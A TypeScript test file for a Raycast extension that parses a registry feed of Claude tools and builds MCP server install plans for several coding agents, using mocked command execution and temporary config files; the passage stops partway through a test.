import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { describe, it } from "node:test";

import {
  CACHE_KEY,
  DETAIL_CACHE_PREFIX,
  REGISTRY_SEARCH_URL,
  RECENT_UPDATES_CACHE_KEY,
  RAYCAST_FEED_OVERRIDE_ENV,
  TRENDING_CACHE_KEY,
  absoluteDataUrl,
  attachDiscoveryEntries,
  buildFeedSnapshotMetadata,
  buildContributeEntryUrl,
  buildEntrySummary,
  buildInstallNotesSummary,
  normalizeNotes,
  buildSuggestChangeUrl,
  buildSubmitPrUrl,
  categoryLabel,
  detailCacheKey,
  entryKey,
  fallbackDetail,
  feedCacheKey,
  feedMetadataCacheKey,
  filterEntriesBySearchText,
  filterDiscoveryEntries,
  hasValidDiscoveryEntries,
  filterEntriesByCategory,
  isRaycastDetail,
  parseDetail,
  parseFavoriteKeys,
  parseFeed,
  parseRegistrySearch,
  parseRecentUpdatesFeed,
  parseTrendingFeed,
  recentUpdatesCacheKey,
  recentUpdatesFeedUrl,
  registryManifestUrl,
  registrySearchUrl,
  resolveConfiguredFeedUrl,
  resolveFeedUrl,
  serializeFavoriteKeys,
  sortedCategoryOptions,
  trendingCacheKey,
  trendingFeedUrl,
  type RaycastEntry,
} from "../src/feed";
import {
  fetchFreshRecentUpdates,
  fetchFreshFeed,
  fetchRegistrySearch,
  fetchFreshTrending,
  loadCachedFeed,
  loadCachedRecentUpdates,
  loadCachedTrending,
  loadEntryDetail,
  type RaycastTextCache,
} from "../src/runtime";
import {
  buildJobMarkdown,
  buildJobSummary,
  buildPostJobUrl,
  FAVORITE_JOBS_KEY,
  filterJobs,
  isValidRaycastJob,
  jobKey,
  jobsCacheKey,
  JOBS_CACHE_KEY,
  parseFavoriteJobKeys,
  parseJobsFeed,
  resolveJobsUrl,
  serializeFavoriteJobKeys,
  sortedJobFilterOptions,
  type RaycastJob,
} from "../src/jobs-feed";
import { fetchFreshJobs, loadCachedJobs } from "../src/jobs-runtime";
import { markdownLink, withRaycastUtm } from "../src/links";
import {
  buildSubmissionDraftText,
  isValidDomain,
  isValidHttpsUrl,
  normalizeDomain,
  normalizeSubmissionDraft,
  slugify,
} from "../src/submission";
import {
  MCP_INSTALL_TARGETS,
  buildMcpInstallPlan,
  buildClaudeMcpInstallPlan,
  defaultMcpConfigPath,
  extractMcpServerConfig,
  extractClaudeMcpServerConfig,
  installMcpServer,
  installClaudeMcpServer,
  mcpConfigSupportsTarget,
  mcpInstallTargetsForConfig,
  mcpJsonConfigPathCandidates,
  mcpServerExists,
  resolveMcpJsonConfigPath,
  resolveMcpCli,
  resolveClaudeCli,
} from "../src/mcp-installer";

const sampleEntry: RaycastEntry = {
  category: "mcp",
  slug: "context7",
  title: "Context7",
  description: "Fetch up-to-date docs.",
  tags: ["docs", "mcp"],
  brandName: "Upstash",
  brandDomain: "upstash.com",
  brandIconUrl:
    "https://cdn.brandfetch.io/domain/upstash.com/w/128/h/128/icon.png?c=test-client",
  brandAssetSource: "brandfetch",
  installable: true,
  hasInstallCommand: true,
  hasConfigSnippet: false,
  mcpInstallTargets: ["claude-code", "codex", "cursor", "antigravity"],
  installCommand: "claude mcp add context7",
  configSnippet: "",
  copyText: "complete asset",
  copyTextLength: 14,
  copyTextTruncated: false,
  detailMarkdown: "# Context7",
  detailUrl: "/data/raycast/mcp/context7.json",
  webUrl: "https://heyclau.de/mcp/context7",
  repoUrl: "https://github.com/upstash/context7",
  documentationUrl: "https://context7.com",
  downloadTrust: "external",
  verificationStatus: "validated",
  trustSignals: {
    sourceStatus: "available",
    hasSafetyNotes: true,
    hasPrivacyNotes: false,
    platforms: ["claude-code"],
  },
};

function sampleSearchResult(overrides: Record<string, unknown> = {}) {
  return {
    category: sampleEntry.category,
    slug: sampleEntry.slug,
    title: sampleEntry.title,
    description: sampleEntry.description,
    tags: sampleEntry.tags,
    author: sampleEntry.author,
    brandName: sampleEntry.brandName,
    brandDomain: sampleEntry.brandDomain,
    brandIconUrl: sampleEntry.brandIconUrl,
    canonicalUrl: sampleEntry.webUrl,
    repoUrl: sampleEntry.repoUrl,
    documentationUrl: sampleEntry.documentationUrl,
    llmsUrl: sampleEntry.llmsUrl,
    apiUrl: sampleEntry.apiUrl,
    downloadTrust: sampleEntry.downloadTrust,
    verificationStatus: sampleEntry.verificationStatus,
    platforms: ["claude-code"],
    installable: true,
    hasInstallCommand: true,
    hasConfigSnippet: true,
    mcpInstallTargets: ["claude-code", "codex", "cursor", "antigravity"],
    trustSignals: {
      sourceStatus: "available",
      hasSafetyNotes: true,
      hasPrivacyNotes: true,
      platforms: ["claude-code"],
    },
    searchScore: 137,
    searchReasons: ["title phrase", "source-backed"],
    ...overrides,
  };
}

const sampleJob: RaycastJob = {
  slug: "ai-systems-engineer",
  title: "AI Systems Engineer",
  company: "Example Co",
  companyUrl: "https://example.com",
  location: "Remote",
  description: "Build Claude-native workflow systems.",
  type: "Full-time",
  postedAt: "2026-04-28",
  compensation: "$150K-$190K",
  equity: "Offered",
  benefits: ["Health benefits", "Remote work"],
  responsibilities: ["Ship integrations"],
  requirements: ["TypeScript"],
  featured: true,
  sponsored: false,
  applyUrl: "https://example.com/jobs/ai-systems-engineer",
  tier: "featured",
  source: "curated",
  sourceKind: "official_ats",
  sourceUrl: "https://example.com/jobs/ai-systems-engineer",
  sourceLabel: "Editorially curated",
  applySourceLabel: "External apply via ATS",
  lastVerifiedAt: "2026-04-28",
  isRemote: true,
  isWorldwide: true,
  webUrl: "https://heyclau.de/jobs/ai-systems-engineer",
  labels: ["Featured", "Editorially curated", "Remote", "Compensation listed"],
};

class MemoryCache implements RaycastTextCache {
  values = new Map<string, string>();
  get(key: string) {
    return this.values.get(key);
  }
  set(key: string, value: string) {
    this.values.set(key, value);
  }
  remove(key: string) {
    this.values.delete(key);
  }
}

function response(body: unknown, init: ResponseInit = {}) {
  return new Response(typeof body === "string" ? body : JSON.stringify(body), {
    status: 200,
    headers: { "content-type": "application/json" },
    ...init,
  });
}

function sha256Hex(value: string) {
  return createHash("sha256").update(value, "utf8").digest("hex");
}

async function captureConsoleWarnings<T>(callback: () => T | Promise<T>) {
  const originalWarn = console.warn;
  const warnings: string[] = [];
  console.warn = (...messages: unknown[]) => {
    warnings.push(messages.map(String).join(" "));
  };
  try {
    return { value: await callback(), warnings };
  } finally {
    console.warn = originalWarn;
  }
}

function readSourceFiles(
  dir: string,
): Array<{ filePath: string; source: string }> {
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const entryPath = path.join(dir, entry.name);
    if (entry.isDirectory()) return readSourceFiles(entryPath);
    if (!/\.(ts|tsx)$/.test(entry.name)) return [];
    return [
      { filePath: entryPath, source: fs.readFileSync(entryPath, "utf8") },
    ];
  });
}

describe("Raycast feed helpers", () => {
  it("parses valid envelope entries and drops malformed rows", () => {
    const richSkillEntry = {
      ...sampleEntry,
      category: "skills",
      slug: "rich-skill",
      platformCompatibility: [
        {
          platform: "Claude",
          supportLevel: "native-skill",
          installPath: ".claude/skills/<skill-name>/SKILL.md",
        },
        {
          platform: "Cursor",
          supportLevel: "adapter",
          adapterPath: "/data/skill-adapters/cursor/rich-skill.mdc",
        },
        { platform: "Generic AGENTS" },
        { supportLevel: "missing-platform" },
      ],
      tags: ["skills", "skills", { invalid: true }],
    };
    const parsed = parseFeed(
      JSON.stringify({
        generatedAt: "2026-04-27T00:00:00.000Z",
        entries: [sampleEntry, richSkillEntry, { category: "mcp" }],
      }),
    );

    assert.equal(parsed.generatedAt, "2026-04-27T00:00:00.000Z");
    assert.equal(parsed.entries[0].slug, sampleEntry.slug);
    assert.deepEqual(parsed.entries[0].tags, sampleEntry.tags);
    assert.deepEqual(parsed.entries[0].mcpInstallTargets, [
      "claude-code",
      "codex",
      "cursor",
      "antigravity",
    ]);
    assert.equal(parsed.entries[0].brandDomain, sampleEntry.brandDomain);
    assert.deepEqual(parsed.entries[1].platformCompatibility, [
      "Claude: native-skill",
      "Cursor: adapter",
      "Generic AGENTS",
    ]);
    assert.deepEqual(parsed.entries[1].tags, ["skills"]);
    assert.equal(parsed.entries.length, 2);
  });

  it("keeps the generated Raycast feed safe for native UI string props", () => {
    const feedPath = path.resolve(
      process.cwd(),
      "..",
      "..",
      "apps",
      "web",
      "public",
      "data",
      "raycast-index.json",
    );
    const raw = fs.existsSync(feedPath)
      ? fs.readFileSync(feedPath, "utf8")
      : JSON.stringify({
          generatedAt: "2026-04-28T00:00:00.000Z",
          entries: [sampleEntry],
        });
    const rawFeed = JSON.parse(raw) as {
      entries?: unknown[];
    };
    const parsed = parseFeed(raw);

    assert.equal(parsed.entries.length, rawFeed.entries?.length);
    assert.ok(parsed.entries.length > 0);
    for (const entry of parsed.entries) {
      assert.equal(
        entry.tags.every((tag) => typeof tag === "string"),
        true,
      );
      assert.equal(
        (entry.platformCompatibility || []).every(
          (platform) => typeof platform === "string",
        ),
        true,
      );
    }
  });

  it("rejects retired array feed payloads", () => {
    const parsed = parseFeed(JSON.stringify([sampleEntry]));

    assert.equal(parsed.generatedAt, "");
    assert.deepEqual(parsed.entries, []);
  });

  it("treats malformed envelopes as empty feeds", () => {
    assert.deepEqual(parseFeed(JSON.stringify({ entries: null })), {
      entries: [],
      generatedAt: "",
    });
  });

  it("parses registry search responses into Raycast-compatible entries", () => {
    const parsed = parseRegistrySearch(
      JSON.stringify({
        schemaVersion: 1,
        query: "context",
        category: "mcp",
        total: 2,
        limit: 1,
        offset: 0,
        nextOffset: 1,
        results: [sampleSearchResult()],
        facets: {
          categories: { mcp: 2 },
          platforms: { "claude-code": 2 },
          installable: { true: 2 },
          hasSafetyNotes: { true: 1, false: 1 },
          hasPrivacyNotes: { true: 1, false: 1 },
          downloadTrust: { external: 2 },
          claimStatus: { unclaimed: 2 },
          sourceStatus: { available: 2 },
        },
      }),
    );

    assert.equal(parsed.query, "context");
    assert.equal(parsed.category, "mcp");
    assert.equal(parsed.total, 2);
    assert.equal(parsed.nextOffset, 1);
    assert.equal(parsed.entries[0].slug, sampleEntry.slug);
    assert.equal(
      parsed.entries[0].detailUrl,
      "/data/raycast/mcp/context7.json",
    );
    assert.match(parsed.entries[0].copyText, /https:\/\/heyclau.de\/mcp/);
    assert.match(parsed.entries[0].detailMarkdown, /## Source/);
    assert.deepEqual(parsed.entries[0].platformCompatibility, ["claude-code"]);
    assert.deepEqual(parsed.entries[0].mcpInstallTargets, [
      "claude-code",
      "codex",
      "cursor",
      "antigravity",
    ]);
    assert.equal(parsed.entries[0].installable, true);
    assert.equal(parsed.entries[0].hasConfigSnippet, true);
    assert.equal(parsed.entries[0].searchScore, 137);
    assert.deepEqual(parsed.entries[0].searchReasons, [
      "title phrase",
      "source-backed",
    ]);
    assert.equal(parsed.entries[0].trustSignals?.sourceStatus, "available");
    assert.deepEqual(parsed.facets?.installable, { true: 2 });
    assert.equal(parsed.skippedMalformedEntries, undefined);
  });

  it("skips malformed registry search rows without discarding valid results", async () => {
    const { value: parsed, warnings } = await captureConsoleWarnings(() =>
      parseRegistrySearch(
        JSON.stringify({
          schemaVersion: 1,
          query: "context",
          category: "mcp",
          total: 2,
          limit: 2,
          offset: 0,
          nextOffset: null,
          results: [sampleSearchResult(), { slug: "bad" }],
        }),
      ),
    );

    assert.equal(parsed.entries.length, 1);
    assert.equal(parsed.entries[0].slug, sampleEntry.slug);
    assert.equal(parsed.skippedMalformedEntries, 1);
    assert.match(warnings[0], /Skipped 1 malformed registry search result/);

    assert.throws(
      () => parseRegistrySearch(JSON.stringify({ results: [{ slug: "bad" }] })),
      /missing numeric total/,
    );
  });

  it("parses discovery feeds and maps them onto full Raycast entries", () => {
    const toolEntry = { ...sampleEntry, category: "tools", slug: "raycast" };
    const trending = parseTrendingFeed(
      JSON.stringify({
        generatedAt: "2026-05-26T00:00:00.000Z",
        kind: "registry-trending",
        category: "all",
        platform: "all",
        signalsAvailable: { votes: true, community: false, intent: true },
        entries: [
          {
            category: "tools",
            slug: "raycast",
            title: "Raycast",
            description: "Desktop launcher.",
            score: 12.7,
            reasons: ["upvotes", "recent_intent"],
          },
          { category: "mcp" },
        ],
      }),
    );
    const recent = parseRecentUpdatesFeed(
      JSON.stringify({
        generatedAt: "2026-05-26T00:00:00.000Z",
        currentSignature: "abc123",
        entries: [
          {
            key: "mcp:context7",
            type: "added",
            category: "mcp",
            slug: "context7",
            title: "Context7",
            dateAdded: "2026-05-26",
          },
        ],
      }),
    );

    assert.equal(
      hasValidDiscoveryEntries(JSON.stringify({ entries: [] })),
      false,
    );
    assert.equal(
      hasValidDiscoveryEntries(
        JSON.stringify({ entries: [{ title: "no key" }] }),
      ),
      false,
    );
    assert.equal(hasValidDiscoveryEntries(JSON.stringify({ ok: true })), false);
    assert.equal(
      hasValidDiscoveryEntries(
        JSON.stringify({ entries: [{ category: "mcp", slug: "context7" }] }),
      ),
      true,
    );
    assert.equal(trending.signalsAvailable?.votes, true);
    assert.equal(trending.entries.length, 1);
    assert.equal(trending.entries[0].key, "tools:raycast");
    assert.deepEqual(trending.entries[0].reasons, ["upvotes", "recent_intent"]);
    assert.equal(recent.currentSignature, "abc123");
    assert.equal(recent.entries[0].updatedAt, "2026-05-26");
    assert.equal(recent.entries[0].updateKind, "added");

    const attached = attachDiscoveryEntries(
      [sampleEntry, toolEntry],
      [...trending.entries, ...recent.entries],
    );
    assert.deepEqual(
      attached.map((entry) => entryKey(entry)),
      ["tools:raycast", "mcp:context7"],
    );
    assert.deepEqual(
      filterDiscoveryEntries(
        attached,
        "favorites",
        new Set(["mcp:context7"]),
      ).map((entry) => entryKey(entry)),
      ["mcp:context7"],
    );
    assert.deepEqual(
      filterDiscoveryEntries(attached, "tools", new Set()).map((entry) =>
        entryKey(entry),
      ),
      ["tools:raycast"],
    );
  });

  it("renders removed diff references as fallback rows only when requested", () => {
    const removedReference = parseRecentUpdatesFeed(
      JSON.stringify({
        generatedAt: "2026-05-26T00:00:00.000Z",
        currentSignature: "abc123",
        entries: [
          {
            key: "mcp:retired",
            type: "removed",
            category: "mcp",
            slug: "retired",
            title: "Retired MCP",
            description: "Removed from the registry.",
            canonicalUrl: "https://heyclau.de/mcp/retired",
          },
        ],
      }),
    ).entries;

    // Default behavior (e.g. trending): removed-only references are dropped.
    assert.deepEqual(attachDiscoveryEntries([], removedReference), []);

    const fallback = attachDiscoveryEntries([], removedReference, {
      fallbackForRemoved: true,
    });
    assert.equal(fallback.length, 1);
    assert.equal(entryKey(fallback[0]), "mcp:retired");
    assert.equal(fallback[0].title, "Retired MCP");
    assert.equal(fallback[0].webUrl, "https://heyclau.de/mcp/retired");
    assert.equal(fallback[0].repoUrl, "");
    assert.equal(fallback[0].discovery.updateKind, "removed");
    assert.match(fallback[0].detailMarkdown, /Retired MCP/);

    // Non-removed references without a matching entry stay dropped even with the flag.
    const addedReference = parseRecentUpdatesFeed(
      JSON.stringify({
        generatedAt: "2026-05-26T00:00:00.000Z",
        currentSignature: "abc123",
        entries: [
          { key: "mcp:ghost", type: "added", category: "mcp", slug: "ghost" },
        ],
      }),
    ).entries;
    assert.deepEqual(
      attachDiscoveryEntries([], addedReference, { fallbackForRemoved: true }),
      [],
    );
  });

  it("normalizes detail URLs relative to the public feed", () => {
    assert.equal(
      absoluteDataUrl("/data/raycast/mcp/context7.json"),
      "https://heyclau.de/data/raycast/mcp/context7.json",
    );
    assert.equal(
      absoluteDataUrl(
        "/api/brand-assets/icon/discord.com",
        "https://preview.example.com/data/raycast-index.json",
      ),
      "https://preview.example.com/api/brand-assets/icon/discord.com",
    );
  });

  it("validates feed overrides and scopes cache keys by feed URL", () => {
    const devFeed = resolveFeedUrl(
      " https://preview.example.com/data/raycast-index.json#ignored ",
    );
    const localFeed = resolveFeedUrl(
      "http://127.0.0.1:4173/data/raycast-index.json",
    );

    assert.equal(
      devFeed,
      "https://preview.example.com/data/raycast-index.json",
    );
    assert.equal(
      resolveFeedUrl(""),
      "https://heyclau.de/data/raycast-index.json",
    );
    assert.equal(localFeed, "http://127.0.0.1:4173/data/raycast-index.json");
    assert.equal(
      resolveConfiguredFeedUrl(
        { feedUrlOverride: devFeed },
        { [RAYCAST_FEED_OVERRIDE_ENV]: localFeed },
      ),
      localFeed,
    );
    assert.equal(
      resolveConfiguredFeedUrl({ feedUrlOverride: devFeed }, {}),
      devFeed,
    );
    assert.throws(
      () =>
        resolveFeedUrl("http://preview.example.com/data/raycast-index.json"),
      /HTTPS/,
    );
    assert.throws(
      () =>
        resolveFeedUrl("https://preview.example.com/data/search-index.json"),
      /\/data\/raycast-index\.json/,
    );

    assert.equal(feedCacheKey(), CACHE_KEY);
    assert.notEqual(feedCacheKey(devFeed), CACHE_KEY);
    assert.match(feedCacheKey(devFeed), /^heyclaude-raycast-index:/);
    assert.equal(
      detailCacheKey(sampleEntry),
      `${DETAIL_CACHE_PREFIX}:${entryKey(sampleEntry)}`,
    );
    assert.notEqual(
      detailCacheKey(sampleEntry, devFeed),
      `${DETAIL_CACHE_PREFIX}:${entryKey(sampleEntry)}`,
    );
    assert.equal(
      trendingFeedUrl(devFeed, 99),
      "https://preview.example.com/api/registry/trending?limit=50",
    );
    assert.equal(
      recentUpdatesFeedUrl(devFeed, 0),
      "https://preview.example.com/api/registry/diff?limit=1",
    );
    const trendingNaNLimit = new URL(
      trendingFeedUrl(devFeed, Number.NaN),
    ).searchParams.get("limit");
    const recentUpdatesNaNLimit = new URL(
      recentUpdatesFeedUrl(devFeed, Number.NaN),
    ).searchParams.get("limit");
    assert.equal(trendingNaNLimit, "25");
    assert.equal(recentUpdatesNaNLimit, "25");
    assert.ok(Number.isFinite(Number(trendingNaNLimit)));
    assert.ok(Number.isFinite(Number(recentUpdatesNaNLimit)));
    assert.equal(trendingCacheKey(), TRENDING_CACHE_KEY);
    assert.equal(recentUpdatesCacheKey(), RECENT_UPDATES_CACHE_KEY);
    assert.notEqual(trendingCacheKey(devFeed), TRENDING_CACHE_KEY);
    assert.notEqual(recentUpdatesCacheKey(devFeed), RECENT_UPDATES_CACHE_KEY);
  });

  it("builds bounded server search URLs for Raycast queries", () => {
    const url = new URL(
      registrySearchUrl({
        query: " context server ",
        category: "mcp",
        platform: "claude-code",
        installable: "true",
        sourceStatus: "available",
        downloadTrust: "first-party",
        limit: 20,
        offset: 40,
      }),
    );

    assert.equal(url.origin + url.pathname, REGISTRY_SEARCH_URL);
    assert.equal(url.searchParams.get("q"), "context server");
    assert.equal(url.searchParams.get("category"), "mcp");
    assert.equal(url.searchParams.get("platform"), "claude-code");
    assert.equal(url.searchParams.get("installable"), "true");
    assert.equal(url.searchParams.get("sourceStatus"), "available");
    assert.equal(url.searchParams.get("downloadTrust"), "first-party");
    assert.equal(url.searchParams.get("limit"), "20");
    assert.equal(url.searchParams.get("offset"), "40");

    const explicitZero = new URL(
      registrySearchUrl({ query: "context", limit: 0, offset: 0 }),
    );
    assert.equal(explicitZero.searchParams.get("limit"), "0");
    assert.equal(explicitZero.searchParams.get("offset"), "0");

    const omitted = new URL(registrySearchUrl({ query: "context" }));
    assert.equal(omitted.searchParams.has("limit"), false);
    assert.equal(omitted.searchParams.has("offset"), false);
  });

  it("builds Claude Code MCP add-json plans from single-server configs", () => {
    const detail = {
      detailMarkdown: "# Context7",
      configSnippet: JSON.stringify({
        mcpServers: {
          context7: {
            command: "npx",
            args: ["-y", "@upstash/context7-mcp"],
            env: { API_KEY: "${CONTEXT7_API_KEY}" },
          },
        },
      }),
      safetyNotes: ["Runs a local MCP server command."],
    };
    const extracted = extractClaudeMcpServerConfig(detail.configSnippet);
    const plan = buildClaudeMcpInstallPlan(sampleEntry, detail);

    assert.equal(extracted.name, "context7");
    assert.deepEqual(plan.addArgs.slice(0, 3), ["mcp", "add-json", "context7"]);
    assert.deepEqual(plan.addArgs.slice(-2), ["--scope", "user"]);
    assert.equal(plan.getArgs.join(" "), "mcp get context7");
    assert.equal(plan.removeArgs.join(" "), "mcp remove context7");
    assert.match(plan.configJson, /@upstash\/context7-mcp/);
    assert.deepEqual(plan.envPlaceholders, ["${CONTEXT7_API_KEY}"]);
    assert.match(plan.warnings.join(" "), /environment placeholders/i);
  });

  it("builds MCP install plans for Claude Code, Codex, Cursor, and Antigravity", () => {
    const detail = {
      detailMarkdown: "# Context7",
      configSnippet: JSON.stringify({
        mcpServers: {
          context7: {
            command: "npx",
            args: ["-y", "@upstash/context7-mcp"],
            env: { API_KEY: "${CONTEXT7_API_KEY}" },
          },
        },
      }),
    };
    const plans = Object.fromEntries(
      MCP_INSTALL_TARGETS.map((target) => [
        target.id,
        buildMcpInstallPlan(target.id, sampleEntry, detail),
      ]),
    );

    assert.deepEqual(plans["claude-code"].addArgs?.slice(0, 3), [
      "mcp",
      "add-json",
      "context7",
    ]);
    assert.deepEqual(plans.codex.addArgs?.slice(0, 3), [
      "mcp",
      "add",
      "context7",
    ]);
    assert.deepEqual(plans.codex.addArgs?.slice(-3), [
      "npx",
      "-y",
      "@upstash/context7-mcp",
    ]);
    assert.equal(plans.cursor.configPath, defaultMcpConfigPath("cursor"));
    assert.equal(
      plans.antigravity.configPath,
      defaultMcpConfigPath("antigravity"),
    );
  });

  it("normalizes remote MCP configs for target-specific install formats", () => {
    const detail = {
      detailMarkdown: "# Docs MCP",
      configSnippet: JSON.stringify({
        mcpServers: {
          docs: {
            type: "streamable-http",
            url: "https://example.com/mcp",
          },
        },
      }),
    };

    const codexPlan = buildMcpInstallPlan("codex", sampleEntry, detail);
    const antigravityPlan = buildMcpInstallPlan(
      "antigravity",
      sampleEntry,
      detail,
    );

    assert.deepEqual(codexPlan.addArgs, [
      "mcp",
      "add",
      "docs",
      "--url",
      "https://example.com/mcp",
    ]);
    assert.equal(antigravityPlan.config.serverUrl, "https://example.com/mcp");
    assert.equal("url" in antigravityPlan.config, false);
    assert.equal(antigravityPlan.config.type, "http");
  });

  it("rejects ambiguous or malformed MCP configs", () => {
    assert.throws(
      () =>
        extractMcpServerConfig(
          JSON.stringify({
            mcpServers: {
              first: { command: "npx" },
              second: { command: "uvx" },
            },
          }),
        ),
      /one MCP server/,
    );
    assert.throws(
      () => extractMcpServerConfig(JSON.stringify({ nope: true })),
      /compatible/,
    );
    assert.throws(
      () =>
        buildMcpInstallPlan("codex", sampleEntry, {
          detailMarkdown: "# SSE",
          configSnippet: JSON.stringify({
            mcpServers: {
              remote: { type: "sse", url: "https://example.com/sse" },
            },
          }),
        }),
      /not available/,
    );
    const remoteHttpConfig = {
      type: "http",
      url: "http://mcp.example.com/mcp",
    };
    assert.equal(
      mcpConfigSupportsTarget(remoteHttpConfig, "claude-code"),
      false,
    );
    assert.deepEqual(mcpInstallTargetsForConfig(remoteHttpConfig), []);
    assert.deepEqual(
      mcpInstallTargetsForConfig({
        type: "http",
        url: "http://127.0.0.1:3000/mcp",
      }),
      ["claude-code", "codex", "cursor", "antigravity"],
    );
    assert.throws(
      () =>
        buildMcpInstallPlan("claude-code", sampleEntry, {
          detailMarkdown: "# Remote HTTP",
          configSnippet: JSON.stringify({
            mcpServers: { remote: remoteHttpConfig },
          }),
        }),
      /not available/,
    );

    const sseConfig = { type: "sse", url: "https://example.com/sse" };
    assert.equal(mcpConfigSupportsTarget(sseConfig, "codex"), false);
    assert.deepEqual(mcpInstallTargetsForConfig(sseConfig), [
      "claude-code",
      "cursor",
      "antigravity",
    ]);
    assert.throws(
      () =>
        buildMcpInstallPlan("codex", sampleEntry, {
          detailMarkdown: "# SSE",
          mcpInstallTargets: ["claude-code", "cursor", "antigravity"],
          configSnippet: JSON.stringify({
            mcpServers: {
              remote: sseConfig,
            },
          }),
        }),
      /not available/,
    );
    assert.equal(
      mcpConfigSupportsTarget(
        {
          type: "http",
          url: "https://example.com/mcp",
          headers: { Authorization: "Bearer ${MCP_TOKEN}" },
        },
        "codex",
      ),
      false,
    );
    assert.throws(
      () =>
        buildMcpInstallPlan("codex", sampleEntry, {
          detailMarkdown: "# Headers",
          configSnippet: JSON.stringify({
            mcpServers: {
              remote: {
                type: "http",
                url: "https://example.com/mcp",
                headers: { Authorization: "Bearer ${MCP_TOKEN}" },
              },
            },
          }),
        }),
      /not available/,
    );
  });

  it("runs Claude Code installs through non-shell argv and verifies the server", async () => {
    const detail = {
      detailMarkdown: "# Context7",
      configSnippet: JSON.stringify({
        mcpServers: {
          context7: { command: "npx", args: ["-y", "@upstash/context7-mcp"] },
        },
      }),
    };
    const plan = buildClaudeMcpInstallPlan(sampleEntry, detail);
    const calls: Array<{ file: string; args: string[] }> = [];
    const execFileFn = async (file: string, args: string[]) => {
      calls.push({ file, args });
      if (args.join(" ") === "mcp get context7" && calls.length === 2) {
        throw new Error("not installed yet");
      }
      return {};
    };

    await installClaudeMcpServer(plan, { execFileFn });

    assert.deepEqual(
      calls.map((call) => [call.file, call.args[0], call.args[1]]),
      [
        ["claude", "--version", undefined],
        ["claude", "mcp", "get"],
        ["claude", "mcp", "add-json"],
        ["claude", "mcp", "get"],
      ],
    );
    assert.equal(calls[2].args[3], plan.configJson);
  });

  it("runs Codex installs through non-shell argv and verifies the server", async () => {
    const detail = {
      detailMarkdown: "# Context7",
      configSnippet: JSON.stringify({
        mcpServers: {
          context7: {
            command: "npx",
            args: ["-y", "@upstash/context7-mcp"],
          },
        },
      }),
    };
    const plan = buildMcpInstallPlan("codex", sampleEntry, detail);
    const calls: Array<{ file: string; args: string[] }> = [];
    const execFileFn = async (file: string, args: string[]) => {
      calls.push({ file, args });
      if (args.join(" ") === "mcp get context7 --json" && calls.length === 2) {
        throw new Error("not installed yet");
      }
      return {};
    };

    await installMcpServer(plan, { execFileFn });

    assert.deepEqual(
      calls.map((call) => [call.file, call.args[0], call.args[1]]),
      [
        ["codex", "--version", undefined],
        ["codex", "mcp", "get"],
        ["codex", "mcp", "add"],
        ["codex", "mcp", "get"],
      ],
    );
    assert.deepEqual(calls[2].args.slice(-3), [
      "npx",
      "-y",
      "@upstash/context7-mcp",
    ]);
  });

  it("writes Cursor and Antigravity MCP configs with explicit replacement", async () => {
    const tmpDir = fs.mkdtempSync(
      path.join(process.env.TMPDIR || "/tmp", "heyclaude-raycast-"),
    );
    try {
      const detail = {
        detailMarkdown: "# Context7",
        configSnippet: JSON.stringify({
          mcpServers: {
            context7: {
              command: "npx",
              args: ["-y", "@upstash/context7-mcp"],
            },
          },
        }),
      };
      const cursorPath = path.join(tmpDir, "cursor", "mcp.json");
      const cursorPlan = buildMcpInstallPlan("cursor", sampleEntry, detail);

      assert.equal(
        await mcpServerExists(cursorPlan, { configPath: cursorPath }),
        false,
      );
      const firstInstall = await installMcpServer(cursorPlan, {
        configPath: cursorPath,
      });
      assert.equal(firstInstall.replacedExisting, false);
      assert.equal(
        await mcpServerExists(cursorPlan, { configPath: cursorPath }),
        true,
      );
      assert.deepEqual(
        JSON.parse(fs.readFileSync(cursorPath, "utf8")).mcpServers.context7
          .args,
        ["-y", "@upstash/context7-mcp"],
      );
      await assert.rejects(
        installMcpServer(cursorPlan, { configPath: cursorPath }),
        /already exists/,
      );

      const replacement = await installMcpServer(cursorPlan, {
        configPath: cursorPath,
        replaceExisting: true,
        now: new Date("2026-06-07T01:02:03.000Z"),
      });
      assert.equal(replacement.replacedExisting, true);
      assert.match(
        replacement.backupPath || "",
        /mcp\.json\.bak\.heyclaude-20260607T010203Z$/,
      );
      assert.equal(fs.existsSync(replacement.backupPath || ""), true);

      const antigravityCandidates = mcpJsonConfigPathCandidates(
        "antigravity",
        tmpDir,
      );
      assert.deepEqual(antigravityCandidates, [
        path.join(tmpDir, ".gemini", "antigravity", "mcp_config.json"),
        path.join(tmpDir, ".gemini", "config", "mcp_config.json"),
      ]);
      assert.equal(
        await resolveMcpJsonConfigPath("antigravity", tmpDir),
        antigravityCandidates[0],
      );
      const antigravityPath = antigravityCandidates[1];
      fs.mkdirSync(path.dirname(antigravityPath), { recursive: true });
      fs.writeFileSync(antigravityPath, "", "utf8");
      assert.equal(
        await resolveMcpJsonConfigPath("antigravity", tmpDir),
        antigravityPath,
      );
      const antigravityPlan = buildMcpInstallPlan("antigravity", sampleEntry, {
        detailMarkdown: "# Docs",
        configSnippet: JSON.stringify({
          mcpServers: {
            docs: { url: "https://example.com/mcp" },
          },
        }),
      });

      await installMcpServer(antigravityPlan, {
        configPath: antigravityPath,
      });
      assert.deepEqual(
        JSON.parse(fs.readFileSync(antigravityPath, "utf8")).mcpServers.docs,
        { type: "http", serverUrl: "https://example.com/mcp" },
      );
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("resolves Claude Code from common local install paths when PATH misses it", async () => {
    const calls: Array<{ file: string; args: string[] }> = [];
    const execFileFn = async (file: string, args: string[]) => {
      calls.push({ file, args });
      if (file === "claude") throw new Error("not on PATH");
      return {};
    };

    const resolved = await resolveClaudeCli(execFileFn);

    assert.notEqual(resolved, "claude");
    assert.match(resolved, /\/claude$/);
    assert.deepEqual(calls[0], { file: "claude", args: ["--version"] });
  });

  it("resolves Codex from common local install paths when PATH misses it", async () => {
    const calls: Array<{ file: string; args: string[] }> = [];
    const execFileFn = async (file: string, args: string[]) => {
      calls.push({ file, args });
      if (file === "codex") throw new Error("not on PATH");
      return {};
    };

    const resolved = await resolveMcpCli("codex", execFileFn);

    assert.notEqual(resolved, "codex");
    assert.match(resolved, /\/codex$/);
    assert.deepEqual(calls[0], { file: "codex", args: ["--version"] });
  });

  it("reports a user-facing error when the Claude Code CLI cannot be resolved", async () => {
    await assert.rejects(
      resolveClaudeCli(async () => {
        throw new Error("missing");
      }),
      /Install or reinstall Claude Code/,
    );
  });

  it("requires explicit replacement before removing an existing Claude MCP server", async () => {
    const detail = {
      detailMarkdown: "# Context7",
      configSnippet: JSON.stringify({
